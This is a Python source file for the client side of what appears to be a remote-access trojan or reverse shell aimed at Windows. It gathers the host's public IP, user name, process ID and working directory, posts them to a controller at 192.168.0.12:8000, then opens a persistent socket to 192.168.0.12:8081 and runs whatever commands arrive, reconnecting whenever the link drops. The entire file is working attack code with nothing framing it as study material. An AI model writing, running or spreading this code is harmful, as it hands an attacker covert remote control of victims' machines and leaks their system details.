import os, time, http
from legend import client_legacy
import socket, subprocess, requests
from requests import get
from requests.exceptions import ConnectionError

def waiting(s=None, creds=()):
    del s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(creds)
    except:
        s.close()
        s = waiting(s=s, creds=creds)
        return s
    else:
        return s


ip, port = ("192.168.0.12", 8000)
shell_addr = ("192.168.0.12", 8081)

# os.system('chcp 65001')
subprocess.getoutput('chcp 65001')

client_ip = get("http://api.ipify.org").text
data = {"user": subprocess.getoutput('whoami'), 'pid': str(os.getpid()), 'pwd': str(os.getcwd()), 'ip': client_ip}
# headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
headers = {'Connection':'close'}

url = 'http://' + ip + ':' + str(port) + '/'
# c_len = len(data.get('user')) + len(data.get('pid')) + len(data.get('pwd')) + 10
creds = ('user', 'pass')

while True:
    if (requests.post(url, data=data, auth=creds, headers=headers)).status_code == 200:
        break


time.sleep(1)

# s = waiting(creds=shell_addr)
s = None
while s == None or s.fileno() == -1:
    try:
        del s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(shell_addr)
    except ConnectionRefusedError:
        s.close()
        
        
while True:

    com = s.recv(1024).decode('cp65001')
    try:
        client_legacy.MAIN(command=com, s=s, ip=ip)
        s.send(subprocess.getoutput('cd').encode('cp65001'))
    except:
        s.close()
        s = waiting(creds=shell_addr)

# s.close()